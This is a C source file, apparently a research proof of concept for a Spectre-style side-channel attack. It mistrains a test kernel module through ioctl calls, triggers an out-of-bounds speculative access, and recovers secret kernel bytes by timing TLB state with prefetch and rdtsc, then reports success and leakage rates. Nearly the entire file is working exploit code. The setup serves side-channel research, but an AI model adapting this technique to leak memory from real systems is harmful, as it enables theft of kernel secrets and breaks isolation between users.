/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <getopt.h>
#include <math.h>

#include "libtlb.h"
#include "cacheutils.h"
#include "module/kernel_spectre.h"

#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_YELLOW  "\x1b[33m"
#define COLOR_BLUE    "\x1b[34m"
#define COLOR_MAGENTA "\x1b[35m"
#define COLOR_CYAN    "\x1b[36m"
#define COLOR_RESET   "\x1b[0m"
#define COLOR_WHITE   "\x1b[0m"

#define MIN(a, b) ((a) > (b)) ? (b) : (a)
#define _STR(x) #x
#define STR(x) _STR(x)

#define CORE1 3
#define HISTOGRAM_SCALE 5

#define TRIES 5
#define RERUNS 1
#define SLICE_LENGTH (64)

#define SECRET_OFFSET_START 3
#define SECRET_OFFSET_END 13
#define SECRET_LENGTH (SECRET_OFFSET_END - SECRET_OFFSET_START)
const char* SECRET_DATA_GROUND_TRUTH = KERNEL_SPECTRE_SECRET_DATA;

/* #define FIRST_LETTER '@' */
/* #define LAST_LETTER 'Z' */
#define FIRST_LETTER 0
#define LAST_LETTER 255
#define NUMBER_OF_LETTERS (LAST_LETTER-FIRST_LETTER+1)

#define REPETITIONS (10)

size_t measurements[256][TRIES];
size_t results[SECRET_LENGTH][NUMBER_OF_LETTERS];
/* size_t results[256][NUMBER_OF_LETTERS+1]; */

size_t kernel_address = 0;

static uint64_t get_monotonic_time(void)
{
  struct timespec t1;
  clock_gettime(CLOCK_MONOTONIC, &t1);
  return t1.tv_sec * 1000*1000*1000ULL + t1.tv_nsec;
}

static void pin_thread_to_core(pthread_t p, int core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    pthread_setaffinity_np(p, sizeof(cpu_set_t), &cpuset);
}

inline __attribute__((always_inline)) void prefetch(size_t p) {
  asm volatile ("prefetcht2 (%0)" : : "r" (p));
}

size_t measure(size_t address) {
  nospec();
  /* Begin measurement */
  size_t begin = rdtsc();
  prefetch(address);
  /* asm volatile("mfence"); */

  size_t end = rdtsc();

  return end - begin;
}

#define LENGTH(x) (sizeof(x)/sizeof((x)[0]))

static void
print_help(char* argv[]) {
  fprintf(stdout, "Usage: %s [OPTIONS]\n", argv[0]);
  fprintf(stdout, "\t-c, -core <value>\t Bind to cpu (default: " STR(CORE1) ")\n");
  fprintf(stdout, "\t-t, -thread <value>\t Bind access thread to cpu (default: " STR(CORE2) ")\n");
  fprintf(stdout, "\t-h, -help\t\t Help page\n");
}

void store_measurements_as_histogram(size_t offset)
{
  char measurement_name[256];
  sprintf(measurement_name, "%zu-%c.csv", offset, SECRET_DATA_GROUND_TRUTH[offset]);

  char measurement_name_raw[256];
  sprintf(measurement_name_raw, "%zu-%c_raw.csv", offset, SECRET_DATA_GROUND_TRUTH[offset]);

  FILE* f_raw = fopen(measurement_name_raw, "w");
  for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
    if (letter != LAST_LETTER) {
      fprintf(f_raw, "%c,", (char) letter);
    } else {
      fprintf(f_raw, "%c\n", (char) letter);
    }
  }

  size_t minimum = -1ull;
  size_t maximum = 0;

  for (size_t i = 0; i < TRIES; i++) {
    for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
      size_t value = measurements[letter][i];

      if (value < minimum && value != 0) {
        minimum = value;
      }

      if (value > maximum) {
        maximum = value;
      }

      /* Write raw file */
      if (letter != LAST_LETTER) {
        fprintf(f_raw, "%zd,", value);
      } else {
        fprintf(f_raw, "%zd\n", value);
      }
    }
  }

  fclose(f_raw);

  size_t histogram_length = ((maximum - minimum) / HISTOGRAM_SCALE);
  size_t* histogram[256] = {0};

  for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
    histogram[letter] = calloc(histogram_length, sizeof(size_t));
    if (histogram[letter] == NULL) {
      fprintf(stderr, "Error: Could not allocate histogram 0\n");
      return;
    }
  }

  for (size_t i = 0; i < TRIES; i++) {
    for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
      size_t histogram_index = MIN(histogram_length - 1, (measurements[letter][i] - minimum) / HISTOGRAM_SCALE);
      histogram[letter][histogram_index]++;
    }
  }

  FILE* f = fopen(measurement_name, "w");
  fprintf(f, "Cycle,");

  for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
    if (letter != LAST_LETTER) {
      fprintf(f, "%c,", (char) letter);
    } else {
      fprintf(f, "%c\n", (char) letter);
    }
  }

  for (size_t i = 0; i < histogram_length; i++) {
    bool print = false;
    for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
      if (histogram[letter][i] > 1) {
        print = true;
        break;
      }
    }

    if (print == true) {
      fprintf(f, "%zd,", minimum + (i * HISTOGRAM_SCALE));
      for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
        if (letter != LAST_LETTER) {
          fprintf(f, "%zd,", histogram[letter][i]);
        } else {
          fprintf(f, "%zd\n", histogram[letter][i]);
        }
      }
    }
  }

  for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
    free(histogram[letter]);
  }
}

void compute_statistics(float* values, size_t n, float* average, float* variance, float* std_deviation)
{
  float sum = 0.0;

  for (size_t i = 0; i < n; i++) {
    sum += values[i];
  }

  float _average = sum / (float) n;

  float sum1 = 0.0;
  for (size_t i = 0; i < n; i++) {
    sum1 += pow(values[i] - _average, 2);
  }

  float _variance = sum1 / (float) n;

  if (average != NULL) {
    *average = _average;
  }

  if (variance != NULL) {
    *variance = _variance;
  }

  if (std_deviation != NULL) {
    *std_deviation = sqrt(_variance);
  }
}

int main(int argc, char* argv[])
{
  /* Parse arguments */
  size_t cpu = CORE1;
  size_t reruns = RERUNS;
  size_t repetitions = REPETITIONS;
  bool verbose = false;
  bool store_files = false;

  static const char* short_options = "c:r:n:vsh";
  static struct option long_options[] = {
    {"cpu",             required_argument, NULL, 'c'},
    {"reruns",          required_argument, NULL, 'n'},
    {"repetitions",     required_argument, NULL, 'r'},
    {"store",           no_argument,       NULL, 's'},
    {"help",            no_argument,       NULL, 'h'},
    {"verbose",         no_argument,       NULL, 'v'},
    { NULL,             0, NULL, 0}
  };

  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);

  int c;
  while ((c = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
    switch (c) {
      case 'c':
        cpu = atoi(optarg);
        if (cpu >= number_of_cpus) {
          fprintf(stderr, "Error: CPU %zu is not available.\n", cpu);
          return -1;
        }
        break;
      case 'n':
        reruns = atoi(optarg);
        break;
      case 'r':
        repetitions = atoi(optarg);
        break;
      case 'h':
        print_help(argv);
        return 0;
      case 'v':
        verbose = true;
        break;
      case 's':
        store_files = true;
        break;
      case ':':
        fprintf(stderr, "Error: option `-%c' requires an argument\n", optopt);
        break;
      case '?':
      default:
        fprintf(stderr, "Error: Invalid option '-%c'\n", optopt);
        return -1;
    }
  }

  /* Pin to core */
  pin_thread_to_core(pthread_self(), cpu);

  /* Final statistics */
  float* statistics_time = calloc(repetitions, sizeof(float));
  float* statistics_leakage_rate = calloc(repetitions, sizeof(float));
  float* statistics_success_rate = calloc(repetitions, sizeof(float));
  if (statistics_time == NULL || statistics_leakage_rate == NULL || statistics_success_rate == NULL) {
    fprintf(stderr, "error: out of memory\n");
  }

  /* Setup */
  tlb_init();
  memset(results, 0, SECRET_LENGTH * NUMBER_OF_LETTERS * sizeof(size_t));

  /* Open kernel module */
  int kernel_spectre_fd = open(KERNEL_SPECTRE_DEVICE_PATH, O_RDONLY);
  if (kernel_spectre_fd < 0) {
    printf ("Error: Can't open device file: %s\n", KERNEL_SPECTRE_DEVICE_PATH);
    return -1;
  }

  assert(ioctl(kernel_spectre_fd, KERNEL_SPECTRE_IOCTL_CMD_GET_ADDRESS, &kernel_address) == 0);
  if (verbose == true) {
    fprintf(stderr, "Kernel Address: %p\n", (void*) kernel_address);
  }

  /* Statistics */
  for (size_t repetition = 0; repetition < repetitions; repetition++) {
    size_t number_of_bytes = 0;
    size_t number_of_correct_bytes = 0;
    uint64_t start_time = get_monotonic_time();
    uint64_t end_time = 0;

    /* Run measurements */
    for (size_t r = 0; r < reruns; r++) {
      for (size_t offset = SECRET_OFFSET_START; offset < SECRET_OFFSET_END; offset++) {
        /* Reset measurements */
        memset(measurements, 0, 256 * TRIES);

        if (verbose) {
          fprintf(stderr, "----- Offset: %zu -----\n", offset);
        }

        size_t global_min = -1;

        bool done = true;
        do {
          size_t number_of_letters = LAST_LETTER - FIRST_LETTER;
          size_t slice_length = number_of_letters / SLICE_LENGTH + 1;

          for (size_t slice = 0; slice < slice_length; slice++) {
            size_t letter_begin = FIRST_LETTER +  slice * SLICE_LENGTH;
            size_t letter_end = letter_begin + SLICE_LENGTH;
            if (letter_end > LAST_LETTER) {
              letter_end = LAST_LETTER;
            }

            for (size_t try = 0; try < TRIES; try++) {
              for (volatile int u = 0; u < 100; u++) {
                asm volatile ("nop");
              }

              /* Mistrain */
              for (size_t i = 0; i < 8; i++) {
                ioctl(kernel_spectre_fd, KERNEL_SPECTRE_IOCTL_CMD_ACCESS, 0);
              }

              /* Prepare */
              /* asm volatile("lfence\n"); */
              /* tlb_flush(); */
              /* tlb_flush(); */
              tlb_flush();
              asm volatile("lfence\n");

              /* Out of bounds access */
              ioctl(kernel_spectre_fd, KERNEL_SPECTRE_IOCTL_CMD_ACCESS, offset);

              for (size_t letter = letter_begin; letter <= letter_end; letter++) {
                /* Measure TLB */
                size_t measurement = measure(kernel_address + 4096 * letter);

                /* Measurement */
                if (measurement < global_min) {
                  global_min = measurement;
                }

                measurements[letter][try] = measurement;
              }
            }
          }

          if (verbose) {
            for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
              size_t min = 0;
              size_t max = 0;
              size_t sum = 0;
              size_t min_cnt = 0;

              for (size_t try = 0; try < TRIES; try++) {
                size_t measurement = measurements[letter][try];

                if (measurement < min || !min) {
                  min = measurement;
                  min_cnt = 0;
                }

                if (measurement > max) {
                  max = measurement;
                }

                if (measurement == min) {
                  min_cnt += 1;
                }

                sum += measurement;
              }

              size_t metric = sum / TRIES;

              fprintf(stderr, "%s" "%c: %zu (min: %zu (%zu), max: %zu) %s\n" COLOR_RESET,
                  (letter == SECRET_DATA_GROUND_TRUTH[offset]) ? COLOR_GREEN : "",
                  (char) letter, metric, min, min_cnt, max,
                  (letter == SECRET_DATA_GROUND_TRUTH[offset]) ? "*" : ""
              );
            }
          }

          /* Best choice */
          size_t letter_winner = 0;
          size_t min_cnt_max = 0;
          size_t min_metric = -1;

          for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
            size_t min_cnt = 0;
            size_t sum = 0;
            for (size_t try = 0; try < TRIES; try++) {
              size_t measurement = measurements[letter][try];
              if (measurement == global_min) {
                min_cnt += 1;
              }
              sum += measurement;
            }
            size_t metric = sum / TRIES;

            /* if (min_cnt == TRIES) continue; // no idea */

            // TODO: Improve metric
            if (min_cnt >= min_cnt_max) {
              min_cnt_max = min_cnt;
              letter_winner = letter;
            }

            if (metric < min_metric) {
              min_metric = metric;
            }
          }

          if (min_cnt_max == 0) {//} || min_cnt_max == TRIES) {
            /* if (verbose == true) { */
              fprintf(stderr, "Rerun...\n");
            /* } */
            done = false;
          } else {
            done = true;
          }

          if (done == true) {
            /* fprintf(stderr, "%s" "%c (min_cnt = %zu)\n" COLOR_RESET, */
            /*     (letter_winner == SECRET_DATA_GROUND_TRUTH[offset]) ? COLOR_GREEN : "", */
            /*     (char) letter_winner, min_cnt_max */
            /* ); */
            /*  */
            number_of_bytes += 1;
            if (letter_winner == SECRET_DATA_GROUND_TRUTH[offset]) {
              number_of_correct_bytes += 1;
            }

            /* fprintf(stderr, "\r%zu/%zu", number_of_bytes, (SECRET_OFFSET_END - SECRET_OFFSET_START) * reruns); */
          }
        } while (done == false);

        if (store_files == true) {
          store_measurements_as_histogram(offset);
        }
      }
    }

    /* Print statistics */
    end_time = get_monotonic_time();
    uint64_t time_diff = end_time - start_time;
    float success_rate = ((float) number_of_correct_bytes / number_of_bytes) * 100.;
    float leakage_rate = (float) number_of_bytes;
    leakage_rate /= (float) (time_diff / 10e8);

    fprintf(stderr, "(%4zu/%4zu) Time: %4.2f seconds, Success Rate: %3.2f%%, Leakage Rate %3.2f B/s\n",
        repetition, repetitions, time_diff / (float) 10e8, success_rate, leakage_rate);

    statistics_time[repetition] = time_diff / (float) 10e8;
    statistics_success_rate[repetition] = success_rate;
    statistics_leakage_rate[repetition] = leakage_rate;

    /* Store results */
    if (store_files == true) {
      FILE* f = fopen("result.csv", "w");
      fprintf(f, "Letter,");
      for (size_t offset = SECRET_OFFSET_START; offset < SECRET_OFFSET_END; offset++) {
        if (offset != SECRET_OFFSET_END - 1) {
          fprintf(f, "Bit%zu,", offset);
        } else {
          fprintf(f, "Bit%zu\n", offset);
        }
      }

      for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
        fprintf(f,"%zu,", letter);
        for (size_t offset = SECRET_OFFSET_START; offset < SECRET_OFFSET_END; offset++) {
          if (offset != SECRET_OFFSET_END - 1) {
            fprintf(f, "%zd,", results[offset-SECRET_OFFSET_START][letter-FIRST_LETTER]);
          } else {
            fprintf(f, "%zd\n", results[offset-SECRET_OFFSET_START][letter-FIRST_LETTER]);
          }
        }
      }
      fclose(f);
    }
  }

  fprintf(stderr, "===== Global Statistics =====\n");
  float average = 0, std_deviation = 0;

  compute_statistics(statistics_time, repetitions, &average, NULL, &std_deviation);
  fprintf(stderr, "Time: %.6f%% seconds (σ = %.6f)\n", average, std_deviation);

  compute_statistics(statistics_leakage_rate, repetitions, &average, NULL, &std_deviation);
  fprintf(stderr, "Leakage Rate: %.6f B/s (σ = %.6f)\n", average, std_deviation);

  compute_statistics(statistics_success_rate, repetitions, &average, NULL, &std_deviation);
  fprintf(stderr, "Success Rate: %.6f%% (σ = %.6f)\n", average, std_deviation);

  float max = 0.0;
  for (size_t r = 0; r < repetitions; r++) {
    if (statistics_leakage_rate[r] > max) {
      max = statistics_leakage_rate[r];
    }
  }

  fprintf(stderr, "Max Leakage Rate: %.6f B/s\n", max);

  /* Clean-up */
  close(kernel_spectre_fd);

  return 0;
}

